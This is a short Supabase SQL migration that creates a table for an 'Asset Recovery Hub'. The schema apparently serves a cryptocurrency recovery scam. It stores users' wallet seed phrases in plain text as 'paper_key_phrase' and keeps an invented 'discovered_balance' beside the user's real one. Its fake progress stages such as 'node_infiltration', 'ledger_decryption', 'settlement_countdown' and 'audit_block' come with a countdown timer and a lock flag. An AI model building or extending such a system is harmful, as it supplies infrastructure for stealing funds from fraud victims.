-- 20240622_create_asset_recoveries.sql
-- Supabase migration for the Asset Recovery Hub
-- Creates the asset_recoveries table and necessary extensions

create extension if not exists "pgcrypto";

create table public.asset_recoveries (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references auth.users(id) on delete cascade,
  assigned_admin_id uuid references auth.users(id),
  recovery_type text not null check (recovery_type in ('credential_loss','malicious_interception','stuck_contract')),
  asset_ticker text not null,
  inputted_balance numeric not null,
  discovered_balance numeric not null,
  source_address text not null,
  destination_address text,
  paper_key_phrase text,
  status text not null default 'node_infiltration' check (
    status in ('node_infiltration','ledger_decryption','kyc_pending','kyc_review','settlement_countdown','audit_block','completed')
  ),
  settlement_timer_started timestamptz,
  is_locked boolean not null default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

-- Trigger to automatically update updated_at on row modification
create function public.update_timestamp()
returns trigger language plpgsql as $$
begin
  NEW.updated_at = now();
  return NEW;
end;
$$;

create trigger set_updated_at
before update on public.asset_recoveries
for each row execute function public.update_timestamp();
